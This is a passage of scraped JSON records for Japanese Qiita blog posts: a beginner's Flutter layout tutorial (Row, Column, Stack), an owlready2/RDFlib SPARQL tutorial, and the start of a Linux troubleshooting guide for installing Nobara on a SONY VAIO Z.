href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2F4b5b7731-4d76-4fa1-a93c-cfe6519afe2e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a7a418679644777b785a5740d08ef261\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2F4b5b7731-4d76-4fa1-a93c-cfe6519afe2e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a7a418679644777b785a5740d08ef261\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2F4b5b7731-4d76-4fa1-a93c-cfe6519afe2e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=101f044ddde5739644b53d95ca01df38 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3945858/4b5b7731-4d76-4fa1-a93c-cfe6519afe2e.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"119:1-119:12\">\n<span id=\"まとめ\" class=\"fragment\"></span><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>まとめ</h2>\n<p data-sourcepos=\"121:1-121:97\">今回はFlutterで要素を並べるときのレイアウトについて調べてみました。</p>\n<p data-sourcepos=\"123:1-123:30\">個人的にはとりあえず</p>\n<ul data-sourcepos=\"125:1-128:0\">\n<li data-sourcepos=\"125:1-125:17\">x軸なら<code>Row</code>\n</li>\n<li data-sourcepos=\"126:1-126:20\">y軸なら<code>Column</code>\n</li>\n<li data-sourcepos=\"127:1-128:0\">z軸なら<code>Stack</code>\n</li>\n</ul>\n<p data-sourcepos=\"129:1-129:79\">というのを覚えておけば問題ないように感じました<img alt=\":thumbsup:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f44d.png\" title=\":thumbsup:\" width=\"20\" loading=\"lazy\"></p>\n",
      "body": ":::note info\n[毎日Flutter生活 Advent Calendar 2025](https://qiita.com/advent-calendar/2025/everyday_flutter) の4日目です:muscle:\n:::\n\nこんにちは！tatata-keshiです:smiley:\n\n今回はFlutterでレイアウトを組む方法についてまとめてみました。\n\n:::note warn\nこの記事はFlutter歴1週間未満の人が書いています！間違がったことを記載していても寛大な心で教えていただけると幸いです:confounded:\n:::\n\n## Column\nColumnは要素を縦に並べるレイアウトです。\nCSSで言うと`display: flex; flex-direction: column;`のようなイメージです。\n\nhttps://api.flutter.dev/flutter/widgets/Column-class.html\n\n### 実装例\n\n```dart\nclass HomePage extends StatelessWidget {\n  const HomePage({super.key});\n\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      appBar: AppBar(title: Text('ホームページ'), backgroundColor: Colors.greenAccent),\n      body: Container(\n        color: Colors.grey,\n        child: Column(\n          children: [\n            Icon(Icons.home, size: 100, color: Colors.blueAccent),\n            Icon(Icons.favorite, size: 100, color: Colors.redAccent),\n            Icon(Icons.star, size: 100, color: Colors.yellowAccent)\n          ],\n        ),\n      )\n    );\n  }\n}\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3945858/98ff3d45-e86a-4fd7-88dd-0b8a045adb95.png)\n\n\n## Row\n\n次に紹介するのはRowです。RowはColumnとは異なり横に要素を並べるレイアウトです。\nCSSで言えば`display: flex; flex-direction: row`のような感じだと思っています。\n\nhttps://api.flutter.dev/flutter/widgets/Row-class.html\n\n### 実装例\n\n```dart\nclass HomePage extends StatelessWidget {\n  const HomePage({super.key});\n\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      appBar: AppBar(title: Text('ホームページ'), backgroundColor: Colors.greenAccent),\n      body: Container(\n        color: Colors.grey,\n        child: Row(\n          children: [\n            Icon(Icons.home, size: 100, color: Colors.blueAccent),\n            Icon(Icons.favorite, size: 100, color: Colors.redAccent),\n            Icon(Icons.star, size: 100, color: Colors.yellowAccent)\n          ],\n        ),\n      )\n    );\n  }\n}\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3945858/f7a14025-6fe3-4691-8b17-12813b5f6102.png)\n\nちなみにこれらのレイアウトは`maxAxisAlignment`や`crossAxisAlignment`を用いて中央寄せや左右上下寄せといった設定を加えることができます。\n\nそのためCSSのFlexboxのような使用感で使えそうですね！\n\n\n## Stack\n\n先述のColumnとRowがそれぞれy軸とx軸方向に要素を並べるレイアウトなのに対して、このStackはz軸方向に要素を並べるレイアウトになります。\n\nあまり要素を重ねるというのは個人的にイメージがついていないのですが、どのような使われ方が一般的なんでしょうかね:thinking: \n\n### 実装例\n\n```dart\nclass HomePage extends StatelessWidget {\n  const HomePage({super.key});\n\n  @override\n  Widget build(BuildContext context) {\n    return Scaffold(\n      appBar: AppBar(title: Text('ホームページ'), backgroundColor: Colors.greenAccent),\n      body: Container(\n        color: Colors.grey,\n        child: Stack(\n          children: [\n            Icon(Icons.home, size: 100, color: Colors.blueAccent),\n            Icon(Icons.favorite, size: 100, color: Colors.redAccent),\n            Icon(Icons.star, size: 100, color: Colors.yellowAccent)\n          ],\n        ),\n      )\n    );\n  }\n}\n```\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3945858/4b5b7731-4d76-4fa1-a93c-cfe6519afe2e.png)\n\n## まとめ\n\n今回はFlutterで要素を並べるときのレイアウトについて調べてみました。\n\n個人的にはとりあえず\n\n- x軸なら`Row`\n- y軸なら`Column`\n- z軸なら`Stack`\n\nというのを覚えておけば問題ないように感じました:thumbsup:\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T15:21:19+09:00",
      "group": null,
      "id": "d3cd01e33777e13b98ae",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "初心者",
          "versions": []
        },
        {
          "name": "Flutter",
          "versions": []
        },
        {
          "name": "モバイルアプリ",
          "versions": []
        }
      ],
      "title": "Flutterのレイアウトについてまとめてみた【Flutter初心者】",
      "updated_at": "2025-12-09T15:21:19+09:00",
      "url": "https://qiita.com/tatata-keshi/items/d3cd01e33777e13b98ae",
      "user": {
        "description": "よわよわLaravel",
        "facebook_id": "",
        "followees_count": 4,
        "followers_count": 1,
        "github_login_name": "tatata-keshi",
        "id": "tatata-keshi",
        "items_count": 9,
        "linkedin_id": "",
        "location": "",
        "name": "",
        "organization": "",
        "permanent_id": 3945858,
        "profile_image_url": "https://avatars.githubusercontent.com/u/73019225?v=4",
        "team_only": false,
        "twitter_screen_name": "zishuieng",
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h4 data-sourcepos=\"1:1-1:47\">\n<span id=\"532-sparqlにおける接頭辞の扱い\" class=\"fragment\"></span><a href=\"#532-sparql%E3%81%AB%E3%81%8A%E3%81%91%E3%82%8B%E6%8E%A5%E9%A0%AD%E8%BE%9E%E3%81%AE%E6%89%B1%E3%81%84\"><i class=\"fa fa-link\"></i></a>5.3.2 SPARQLにおける接頭辞の扱い</h4>\n<p data-sourcepos=\"3:1-3:131\">owlready2とRDFlibでは、SPARQLでのクエリー文を記述しやすくするために、接頭辞(prefix)が利用できる。</p>\n<table data-sourcepos=\"5:1-6:4\">\n<thead>\n<tr data-sourcepos=\"5:1-5:34\">\n<th style=\"text-align: left\" data-sourcepos=\"5:2-5:33\">graph.bind([prefix], [base IRI])</th>\n</tr>\n</thead>\n</table>\n<p data-sourcepos=\"8:1-8:107\">として、接頭辞とIRI(フラグメントまでの部分)を結び付ければよい。例を示す。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"10:1-25:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; from owlready2 import *\n&gt;&gt;&gt; onto = get_ontology('bacteria.owl').load()\n&gt;&gt;&gt; from rdflib import *\n&gt;&gt;&gt; graph = default_world.as_rdflib_graph()\n&gt;&gt;&gt; graph.bind('owl', 'http://www.w3.org/2002/07/owl#')\n&gt;&gt;&gt; onto.base_iri\n'http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#'\n&gt;&gt;&gt; individual = onto.unknown_bacterium\n&gt;&gt;&gt; list(default_world.sparql_query('''\n... SELECT ?class WHERE{\n... &lt;%s&gt; a ?class .\n... ?class a owl:Class .\n... }''' % individual.iri))\n[[bacteria.Bacterium]]\n</code></pre></div></div>\n<h4 data-sourcepos=\"27:1-27:50\">\n<span id=\"533-sparqlでrdfトリプルを作成する\" class=\"fragment\"></span><a href=\"#533-sparql%E3%81%A7rdf%E3%83%88%E3%83%AA%E3%83%97%E3%83%AB%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>5.3.3 SPARQLでRDFトリプルを作成する</h4>\n<p data-sourcepos=\"29:1-29:125\">SPARQLではINSERT文によりRDFトリプルを作成する。RDFトリプルの作成にはupdate()メソッドを使う。</p>\n<p data-sourcepos=\"31:1-31:128\">RDFトリプルの作成には、with構文を使う方法とget_context()メソッドを使う方法がある。例を示す。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"33:1-50:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; with onto:\n...     graph.update('''\n...     INSERT {\n...     &lt;http://www.test.org/t.owl#MyClass&gt;\n...     &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n...     &lt;http://www.w3.org/2002/07/owl#Class&gt; .\n... } WHERE {}''')\n...\n&gt;&gt;&gt;\n&gt;&gt;&gt; graph2 = graph.get_context(onto)\n&gt;&gt;&gt; graph2.update('''\n... INSERT {\n... &lt;http://www.test.org/t.owl#MyClass2&gt;\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;http://www.w3.org/2002/07/owl#Class&gt; .\n... } WHERE {}''')\n</code></pre></div></div>\n<p data-sourcepos=\"52:1-52:60\">検索すると、生成されたことが確認できる。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"54:1-66:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; ret = graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... &lt;http://www.w3.org/1999/02/22-rdf-syntax-ns#type&gt;\n... &lt;http://www.w3.org/2002/07/owl#Class&gt; .\n... }\"\"\" )\n&gt;&gt;&gt; list(ret)\n[(rdflib.term.BNode('35'),), \n～～～\n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass'),), \n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass2'),)]\n</code></pre></div></div>\n<p data-sourcepos=\"68:1-68:227\">WHERE句を利用する場合、既に存在するクラスやインディビデュアル関連する、RDFトリプルを生成できる。例えば、クラスにコメントのRDFトリプルを追加するものである。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"70:1-92:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; graph2.update('''\n... INSERT {\n... ?class\n... &lt;http://www.w3.org/2000/01/rdf-schema#comment&gt;\n... \"This entity is a class!.\"\n... }WHERE{\n... ?class a &lt;http://www.w3.org/2002/07/owl#Class&gt; .\n... }\n... ''')\n&gt;&gt;&gt; list(graph.query(\"\"\"\n... SELECT ?b ?c WHERE {\n... ?b\n... &lt;http://www.w3.org/2000/01/rdf-schema#comment&gt;\n... ?c\n... }\"\"\" ))\n[(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Shape'), rdflib.term.Literal('This entity is a class!.')), \n～\n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass'), rdflib.term.Literal('This entity is a class!.')),\n～\n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass2'), rdflib.term.Literal('This entity is a class!.')),\n～]\n</code></pre></div></div>\n<h4 data-sourcepos=\"94:1-94:50\">\n<span id=\"534-sparqlでrdfトリプルを削除する\" class=\"fragment\"></span><a href=\"#534-sparql%E3%81%A7rdf%E3%83%88%E3%83%AA%E3%83%97%E3%83%AB%E3%82%92%E5%89%8A%E9%99%A4%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>5.3.4 SPARQLでRDFトリプルを削除する</h4>\n<p data-sourcepos=\"96:1-96:110\">RDFトリプルの削除にはupdate()メソッドを使う。SPARQLの問い合わせはDELETE文となる。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"98:1-116:3\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt; graph2.update('''\n... DELETE{\n... ?class\n... &lt;http://www.w3.org/2000/01/rdf-schema#comment&gt;\n... \"This entity is a class!.\"\n... }WHERE{\n... ?class a &lt;http://www.w3.org/2002/07/owl#Class&gt; .\n... }\n... ''')\n&gt;&gt;&gt; list(graph.query(\"\"\"\n... SELECT ?b ?c WHERE {\n... ?b\n... &lt;http://www.w3.org/2000/01/rdf-schema#comment&gt;\n... ?c\n... }\"\"\" ))\n...\n[]\n</code></pre></div></div>\n",
      "body": "#### 5.3.2 SPARQLにおける接頭辞の扱い\n\nowlready2とRDFlibでは、SPARQLでのクエリー文を記述しやすくするために、接頭辞(prefix)が利用できる。\n\n|graph.bind([prefix], [base IRI])|\n|:-|\n\nとして、接頭辞とIRI(フラグメントまでの部分)を結び付ければよい。例を示す。\n\n```\n>>> from owlready2 import *\n>>> onto = get_ontology('bacteria.owl').load()\n>>> from rdflib import *\n>>> graph = default_world.as_rdflib_graph()\n>>> graph.bind('owl', 'http://www.w3.org/2002/07/owl#')\n>>> onto.base_iri\n'http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#'\n>>> individual = onto.unknown_bacterium\n>>> list(default_world.sparql_query('''\n... SELECT ?class WHERE{\n... <%s> a ?class .\n... ?class a owl:Class .\n... }''' % individual.iri))\n[[bacteria.Bacterium]]\n```\n\n#### 5.3.3 SPARQLでRDFトリプルを作成する\n\nSPARQLではINSERT文によりRDFトリプルを作成する。RDFトリプルの作成にはupdate()メソッドを使う。\n\nRDFトリプルの作成には、with構文を使う方法とget_context()メソッドを使う方法がある。例を示す。\n\n```\n>>> with onto:\n...     graph.update('''\n...     INSERT {\n...     <http://www.test.org/t.owl#MyClass>\n...     <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n...     <http://www.w3.org/2002/07/owl#Class> .\n... } WHERE {}''')\n...\n>>>\n>>> graph2 = graph.get_context(onto)\n>>> graph2.update('''\n... INSERT {\n... <http://www.test.org/t.owl#MyClass2>\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <http://www.w3.org/2002/07/owl#Class> .\n... } WHERE {}''')\n```\n\n検索すると、生成されたことが確認できる。\n\n```\n>>> ret = graph.query(\"\"\"\n... SELECT ?b WHERE {\n... ?b\n... <http://www.w3.org/1999/02/22-rdf-syntax-ns#type>\n... <http://www.w3.org/2002/07/owl#Class> .\n... }\"\"\" )\n>>> list(ret)\n[(rdflib.term.BNode('35'),), \n～～～\n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass'),), \n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass2'),)]\n```\n\nWHERE句を利用する場合、既に存在するクラスやインディビデュアル関連する、RDFトリプルを生成できる。例えば、クラスにコメントのRDFトリプルを追加するものである。\n\n```\n>>> graph2.update('''\n... INSERT {\n... ?class\n... <http://www.w3.org/2000/01/rdf-schema#comment>\n... \"This entity is a class!.\"\n... }WHERE{\n... ?class a <http://www.w3.org/2002/07/owl#Class> .\n... }\n... ''')\n>>> list(graph.query(\"\"\"\n... SELECT ?b ?c WHERE {\n... ?b\n... <http://www.w3.org/2000/01/rdf-schema#comment>\n... ?c\n... }\"\"\" ))\n[(rdflib.term.URIRef('http://lesfleursdunormal.fr/static/_downloads/bacteria.owl#Shape'), rdflib.term.Literal('This entity is a class!.')), \n～\n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass'), rdflib.term.Literal('This entity is a class!.')),\n～\n(rdflib.term.URIRef('http://www.test.org/t.owl#MyClass2'), rdflib.term.Literal('This entity is a class!.')),\n～]\n```\n\n#### 5.3.4 SPARQLでRDFトリプルを削除する\n\nRDFトリプルの削除にはupdate()メソッドを使う。SPARQLの問い合わせはDELETE文となる。\n\n```\n>>> graph2.update('''\n... DELETE{\n... ?class\n... <http://www.w3.org/2000/01/rdf-schema#comment>\n... \"This entity is a class!.\"\n... }WHERE{\n... ?class a <http://www.w3.org/2002/07/owl#Class> .\n... }\n... ''')\n>>> list(graph.query(\"\"\"\n... SELECT ?b ?c WHERE {\n... ?b\n... <http://www.w3.org/2000/01/rdf-schema#comment>\n... ?c\n... }\"\"\" ))\n...\n[]\n```\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T15:16:41+09:00",
      "group": null,
      "id": "b0b430e39c169928e10e",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Python",
          "versions": []
        },
        {
          "name": "オントロジー",
          "versions": []
        },
        {
          "name": "OWL",
          "versions": []
        },
        {
          "name": "知識工学",
          "versions": []
        },
        {
          "name": "owlready2",
          "versions": []
        }
      ],
      "title": "【owlready2】(19) RDFトリプルとWorldを扱う(SPARQLにおける接頭辞の扱い、から)",
      "updated_at": "2025-12-09T15:16:41+09:00",
      "url": "https://qiita.com/gyosanmon/items/b0b430e39c169928e10e",
      "user": {
        "description": "オントロジー、知識工学に取り組んでいます。産業分野だけでなく、人文領域や社会一般への展開を考えています。",
        "facebook_id": "",
        "followees_count": 1,
        "followers_count": 0,
        "github_login_name": null,
        "id": "gyosanmon",
        "items_count": 64,
        "linkedin_id": "",
        "location": "横浜",
        "name": "",
        "organization": "自宅にいます(人文・産業データ構造)",
        "permanent_id": 4239334,
        "profile_image_url": "https://lh3.googleusercontent.com/a/ACg8ocInUZIv3o96tz-z3WxqhUYyEnyiXq_8Pn4z9ttuC27KUP_pQA=s96-c",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": "https://note.com/super_crow2005"
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h1 data-sourcepos=\"1:1-1:106\">\n<span id=\"-sony-vaio-z-vjz131a11n-への-nobara-42-official-インストール時のトラブルと解決策\" class=\"fragment\"></span><a href=\"#-sony-vaio-z-vjz131a11n-%E3%81%B8%E3%81%AE-nobara-42-official-%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E6%99%82%E3%81%AE%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%81%A8%E8%A7%A3%E6%B1%BA%E7%AD%96\"><i class=\"fa fa-link\"></i></a>💻 SONY VAIO Z (VJZ131A11N) への Nobara 42 Official インストール時のトラブルと解決策</h1>\n<p data-sourcepos=\"3:1-4:117\">お役御免となったVAIO Zに最近話題のLinuxディストリビューション「Nobara Linux」を入れて復活させようと試みたところ、トラブルが続出。盛大にハマってしまいました。<br>\n解決までの道のりをまとめたので、同じ現象で困っている方の助けになれば幸いです。</p>\n<hr data-sourcepos=\"6:1-7:0\">\n<h2 data-sourcepos=\"8:1-8:16\">\n<span id=\"️-環境\" class=\"fragment\"></span><a href=\"#%EF%B8%8F-%E7%92%B0%E5%A2%83\"><i class=\"fa fa-link\"></i></a>⚙️ 環境</h2>\n<ul data-sourcepos=\"10:3-15:0\">\n<li data-sourcepos=\"10:3-10:36\">\n<strong>PC:</strong> SONY VAIO Z (VJZ131A11N)</li>\n<li data-sourcepos=\"11:3-11:42\">\n<strong>CPU:</strong> Intel Core i7-6567U (Skylake)</li>\n<li data-sourcepos=\"12:3-12:36\">\n<strong>GPU:</strong> Intel Iris Graphics 550</li>\n<li data-sourcepos=\"13:3-13:50\">\n<strong>OS:</strong> Nobara 42 Official(Based on Fedora 40)</li>\n<li data-sourcepos=\"14:3-15:0\">\n<strong>DE:</strong> KDE Plasma 6</li>\n</ul>\n<hr data-sourcepos=\"16:1-17:0\">\n<h2 data-sourcepos=\"18:1-18:28\">\n<span id=\"️-発生した現象\" class=\"fragment\"></span><a href=\"#%EF%B8%8F-%E7%99%BA%E7%94%9F%E3%81%97%E3%81%9F%E7%8F%BE%E8%B1%A1\"><i class=\"fa fa-link\"></i></a>⚠️ 発生した現象</h2>\n<h3 data-sourcepos=\"20:1-20:56\">\n<span id=\"1-インストール後の再起動でフリーズ\" class=\"fragment\"></span><a href=\"#1-%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E5%BE%8C%E3%81%AE%E5%86%8D%E8%B5%B7%E5%8B%95%E3%81%A7%E3%83%95%E3%83%AA%E3%83%BC%E3%82%BA\"><i class=\"fa fa-link\"></i></a>1. インストール後の再起動でフリーズ</h3>\n<p data-sourcepos=\"22:1-23:134\">USBディスクから起動し内臓のSSDにOSを上書きしてインストール。もろもろ設定を終えていざ再起動。<br>\nすると、VAIOロゴとローディングアニメーション（クルクル）が表示されるが、途中で<strong>完全停止</strong>。</p>\n<h3 data-sourcepos=\"25:1-25:35\">\n<span id=\"2-nomodeset-は効果なし\" class=\"fragment\"></span><a href=\"#2-nomodeset-%E3%81%AF%E5%8A%B9%E6%9E%9C%E3%81%AA%E3%81%97\"><i class=\"fa fa-link\"></i></a>2. <code>nomodeset</code> は効果なし</h3>\n<p data-sourcepos=\"27:1-27:156\">起動オプションに <code>nomodeset</code> を付けても、ローディング後に画面が**真っ黒（ブラックアウト）**になり操作不能。</p>\n<h3 data-sourcepos=\"29:1-29:59\">\n<span id=\"3-ログインできないログインループ\" class=\"fragment\"></span><a href=\"#3-%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E3%83%AB%E3%83%BC%E3%83%97\"><i class=\"fa fa-link\"></i></a>3. ログインできない（ログインループ）</h3>\n<p data-sourcepos=\"31:1-31:193\">なんとかログイン画面まで辿り着いても、パスワード入力後に一瞬画面が暗転し、すぐに<strong>再びログイン画面に戻される</strong>（ログインループ）。</p>\n<blockquote data-sourcepos=\"33:1-34:116\">\n<p data-sourcepos=\"33:3-34:116\"><strong>💡 補足:</strong><br>\nフリーズ時やログインループ時でも、<code>Ctrl + Alt + F2</code> でCUIへのログインは可能でした。</p>\n</blockquote>\n<hr data-sourcepos=\"36:1-37:0\">\n<h2 data-sourcepos=\"38:1-38:23\">\n<span id=\"-原因の特定\" class=\"fragment\"></span><a href=\"#-%E5%8E%9F%E5%9B%A0%E3%81%AE%E7%89%B9%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>🔎 原因の特定</h2>\n<p data-sourcepos=\"40:1-40:172\">色々検証して（これにめちゃくちゃ時間がかかった。。。）最終的に特定された原因は、以下の3つの複合的なトラブルでした。</p>\n<h3 data-sourcepos=\"42:1-42:54\">\n<span id=\"1-cpugpuの省電力機能のバグ-c-state\" class=\"fragment\"></span><a href=\"#1-cpugpu%E3%81%AE%E7%9C%81%E9%9B%BB%E5%8A%9B%E6%A9%9F%E8%83%BD%E3%81%AE%E3%83%90%E3%82%B0-c-state\"><i class=\"fa fa-link\"></i></a>1. CPU/GPUの省電力機能のバグ (<code>c-state</code>)</h3>\n<p data-sourcepos=\"44:1-44:200\"><strong>Skylake世代のCPU</strong>とLinuxカーネルの間の<strong>相性問題</strong>。CPUが深い省電力モードに入った瞬間に、GPUを巻き込んでシステム全体がフリーズしていました。</p>\n<h3 data-sourcepos=\"46:1-46:39\">\n<span id=\"2-waylandと旧intel-gpuの相性\" class=\"fragment\"></span><a href=\"#2-wayland%E3%81%A8%E6%97%A7intel-gpu%E3%81%AE%E7%9B%B8%E6%80%A7\"><i class=\"fa fa-link\"></i></a>2. Waylandと旧Intel GPUの相性</h3>\n<p data-sourcepos=\"48:1-48:213\">Nobara (Fedora) の標準描画方式である <strong>Wayland</strong> が、安定動作せず（この世代の <strong>Intel Iris Graphics</strong> が原因？）、グラフィックシステムがクラッシュしていました。</p>\n<h3 data-sourcepos=\"50:1-50:46\">\n<span id=\"3-sddm-ログイン画面-の不具合\" class=\"fragment\"></span><a href=\"#3-sddm-%E3%83%AD%E3%82%B0%E3%82%A4%E3%83%B3%E7%94%BB%E9%9D%A2-%E3%81%AE%E4%B8%8D%E5%85%B7%E5%90%88\"><i class=\"fa fa-link\"></i></a>3. SDDM (ログイン画面) の不具合</h3>\n<p data-sourcepos=\"52:1-52:146\">標準のディスプレイマネージャーである <strong>SDDM</strong> も、Waylandベースでの動作を試みてクラッシュしていました。</p>\n<hr data-sourcepos=\"54:1-55:0\">\n<h2 data-sourcepos=\"56:1-56:19\">\n<span id=\"-解決手順\" class=\"fragment\"></span><a href=\"#-%E8%A7%A3%E6%B1%BA%E6%89%8B%E9%A0%86\"><i class=\"fa fa-link\"></i></a>✅ 解決手順</h2>\n<p data-sourcepos=\"58:1-58:238\">以降の作業は、起動後のフリーズ状態で <code>Ctrl + Alt + F2</code> を押し、CUIでユーザー名とパスワードを入力してログインし、インターネットへの接続を完了してから実行してください。</p>\n<h3 data-sourcepos=\"60:1-60:69\">\n<span id=\"step-1-カーネルパラメータでフリーズを回避する\" class=\"fragment\"></span><a href=\"#step-1-%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%91%E3%83%A9%E3%83%A1%E3%83%BC%E3%82%BF%E3%81%A7%E3%83%95%E3%83%AA%E3%83%BC%E3%82%BA%E3%82%92%E5%9B%9E%E9%81%BF%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>Step 1: カーネルパラメータでフリーズを回避する</h3>\n<p data-sourcepos=\"62:1-62:117\">VAIO Z特有の「起動時のフリーズ」を防ぐため、CPUとGPUの省電力機能を一部制限します。</p>\n<ol data-sourcepos=\"64:1-65:0\">\n<li data-sourcepos=\"64:1-65:0\">\n<code>/etc/default/grub</code> を編集します。</li>\n</ol>\n\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"68:1-70:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">sudo </span>nano /etc/default/grub\n</code></pre></div></div>\n<ol data-sourcepos=\"72:1-73:0\">\n<li data-sourcepos=\"72:1-73:0\">\n<code>GRUB_CMDLINE_LINUX_DEFAULT</code> の行に以下のパラメータを追記します。</li>\n</ol>\n<blockquote data-sourcepos=\"74:1-74:192\">\n<p data-sourcepos=\"74:3-74:192\"><strong>⚠️ 注意:</strong> <code>resume=UUID=...</code> など既存のUUIDに関する記述は<strong>消さないでください</strong>。<code>quiet splash</code> や <code>nomodeset</code>が残っていれば<strong>消してください</strong>。</p>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"plaintext\" data-sourcepos=\"76:1-78:3\"><div class=\"highlight\"><pre><code>intel_idle.max_cstate=1 i915.enable_dc=0\n</code></pre></div></div>\n<ul data-sourcepos=\"80:3-82:0\">\n<li data-sourcepos=\"80:3-80:145\">\n<code>intel_idle.max_cstate=1</code>: CPUが深い省電力ステート（アイドル状態）に入るのを防ぎ、フリーズを回避します。</li>\n<li data-sourcepos=\"81:3-82:0\">\n<code>i915.enable_dc=0</code>: GPU（ディスプレイコントローラー）の省電力機能（Display C-state）を無効化します。</li>\n</ul>\n\n<ol data-sourcepos=\"85:1-86:0\">\n<li data-sourcepos=\"85:1-86:0\">編集後、GRUBを更新して再起動します。</li>\n</ol>\n\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"89:1-92:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">sudo </span>grub2-mkconfig <span class=\"nt\">-o</span> /boot/grub2/grub.cfg\n<span class=\"nb\">sudo </span>reboot\n</code></pre></div></div>\n<h3 data-sourcepos=\"94:1-94:72\">\n<span id=\"step-2-システム全体の更新を行うトラブル防止\" class=\"fragment\"></span><a href=\"#step-2-%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0%E5%85%A8%E4%BD%93%E3%81%AE%E6%9B%B4%E6%96%B0%E3%82%92%E8%A1%8C%E3%81%86%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E9%98%B2%E6%AD%A2\"><i class=\"fa fa-link\"></i></a>Step 2: システム全体の更新を行う（トラブル防止）</h3>\n<p data-sourcepos=\"96:1-96:162\">Step 4で導入するX11環境とのバージョン不整合（シンボルエラーなど）を防ぐため、システム全体を最新に同期させます。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"98:1-100:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">sudo </span>dnf upgrade <span class=\"nt\">--refresh</span> <span class=\"nt\">-y</span>\n</code></pre></div></div>\n<blockquote data-sourcepos=\"102:1-102:203\">\n<p data-sourcepos=\"102:3-102:203\"><strong>💡 注意:</strong> <code>dnf</code> の処理中、ダウンロードやインストール待ちで数分間フリーズしたように見えますが、<strong>電源を切らず</strong>に辛抱強く待ってください。</p>\n</blockquote>\n<p data-sourcepos=\"104:1-104:60\">完了したら、必ず一度再起動してください。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"106:1-108:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">sudo </span>reboot\n</code></pre></div></div>\n<h3 data-sourcepos=\"110:1-110:54\">\n<span id=\"step-3-display-managerを-lightdm-に変更する\" class=\"fragment\"></span><a 